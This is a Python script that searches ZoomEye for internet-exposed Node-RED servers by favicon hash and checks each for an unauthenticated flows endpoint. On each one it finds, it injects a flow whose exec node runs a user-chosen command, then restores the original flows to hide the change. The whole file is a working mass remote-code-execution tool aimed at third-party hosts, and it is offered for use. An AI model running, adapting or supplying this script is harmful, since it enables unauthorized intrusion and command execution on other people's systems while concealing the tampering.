from zoomeye.sdk import ZoomEye
import requests
import json
import random
import string
import time

command_to_run = "touch im-in-your-walls"  # Replace with your desired command
zoomEyeAPIkey = "YOUR-API-KEY" # Replace with your zoomeye.org API key
zoomEye_page_count = 5 # Multiply this number by 50 to get your total target list (maximum 200 pages before hitting monthly API limit)

zm = ZoomEye(api_key=zoomEyeAPIkey)
path = 'library/local/flows'
ip_count = 0
vulnerableIPCount = 0
codeExecCount = 0

# Icon hash searches for the default node-red favicon.ico, pairing it with up to date results using 'after' returns targets that are most likely to be open and vulnerable 
# data = zm.multi_page_search('after:"2023-05-05" +iconhash: "818dd6afd0d0f9433b21774f89665eea"', page=zoomEye_page_count, facets=None)
data = zm.multi_page_search('iconhash: "818dd6afd0d0f9433b21774f89665eea"', page=zoomEye_page_count, facets=None)

def check_url_for_vuln(ip, port, path):
    url = f"http://{ip}:{port}/{path}"
    
    try:
        response = requests.get(url)
        response_code = response.status_code
        if response_code == 200:
            ret = f"{ip}:{port}"
            print(ret)
            return 1
        else:
            return 0
    except requests.exceptions.RequestException as e:
        #print("An error occurred:", e) BBBAU2S5
        return 0

def get_existing_flows(ip, port):
    url = f"http://{ip}:{port}/flows"
    response = requests.get(url)
    if response.status_code == 200:
        existing_flows = response.json()
        return existing_flows
    else:
        print(f"Failed to retrieve existing flows. Status code: {response.status_code}")
        return None

def upload_flow(ip, port, flow):
    url = f"http://{ip}:{port}/flows"
    headers = {'Content-Type': 'application/json'}
    response = requests.post(url, data=json.dumps(flow), headers=headers)
    if response.status_code == 204:
        print("Flow uploaded successfully.")
    else:
        print(f"Failed to upload flow. Status code: {response.status_code}")
        print(response.text)

def generate_random_name(length):
    letters_and_digits = string.ascii_letters + string.digits
    return ''.join(random.choice(letters_and_digits) for _ in range(length))

def backup_flows(ip, port):
    url = f"http://{ip}:{port}/flows"
    response = requests.get(url)
    if response.status_code == 200:
        flows = response.json()
        return flows
    else:
        print(f"Failed to backup flows. Status code: {response.status_code}")
        return None

def restore_flows(ip, port, flows):
    url = f"http://{ip}:{port}/flows"
    headers = {'Content-Type': 'application/json'}
    response = requests.post(url, data=json.dumps(flows), headers=headers)
    if response.status_code == 204:
        print("Flows restored successfully.")
    else:
        print(f"Failed to restore flows. Status code: {response.status_code}")
        print(response.text)

for item in data:
    ip_count += 1
    ip = item['ip']
    port = item['portinfo']['port']
    #print(f"{ip}:{port}")
    #vulnerableIPCount += navigate_to_url(ip, port,path)
    if check_url_for_vuln(ip, port,path):
        print(f"Executing command on: {ip}:{port}")
        vulnerableIPCount += 1
        # Read the flows JSON from the file
        with open('flows.json', 'r') as file:
            flows_data = json.load(file)

        # Modify the "command" key in the "exec" node
        for flow in flows_data:
            if flow.get('type') == 'exec':
                flow['command'] = command_to_run

        # Get existing flows from Node-RED
        existing_flows = get_existing_flows(ip, port)
        if existing_flows is None:
            exit()

        # Generate a random name for the new flow
        new_flow_name = generate_random_name(10)
        flows_data[0]['id'] = new_flow_name
        flows_data[0]['z'] = new_flow_name

        # Check if the new flow name is already in use
        while any(flow['id'] == new_flow_name for flow in existing_flows):
            new_flow_name = generate_random_name(10)
            flows_data[0]['id'] = new_flow_name
            flows_data[0]['z'] = new_flow_name

        # Backup the existing flows
        flows_backup = backup_flows(ip, port)

        # Append the new flow to the existing flows
        existing_flows.extend(flows_data)

        # Upload the modified flows to Node-RED
        upload_flow(ip, port, existing_flows)

        # Wait to allow for execution.
        time.sleep(1)

        # Restore the original flows
        if flows_backup is not None:
            restore_flows(ip, port, flows_backup)
        else:
            print("Failed to restore flows. Backup not available.")

print("Number of IPs scanned:", ip_count)
print("Number of vulnerable sessions:", vulnerableIPCount)
print("Number of sucessful code executions:", codeExecCount)